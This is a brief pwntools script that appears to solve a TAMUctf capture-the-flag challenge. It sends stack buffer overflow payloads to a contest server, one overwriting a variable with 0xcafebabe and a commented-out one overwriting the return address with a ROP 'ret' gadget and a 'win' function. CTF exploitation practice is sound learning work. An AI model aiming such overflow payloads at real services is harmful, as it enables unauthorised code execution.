from pwn import *

# variable overwrite
io = remote('pwn.tamuctf.com', 4321)
payload = b'A' * 64 + p64(0xcafebabe)
io.sendline(payload)
io.interactive()


# RIP overwrite
# elf = ELF('vulnerable', checksec=True)
# rop = ROP(elf)
# ret = (rop.find_gadget(['ret']))[0]
# win_addr = elf.symbols['win']
# io = remote('pwn.tamuctf.com', 4321)
# payload = b'A' * (64+8) + p64(ret) + p64(win_addr)
# io.sendline(payload)
# io.interactive()
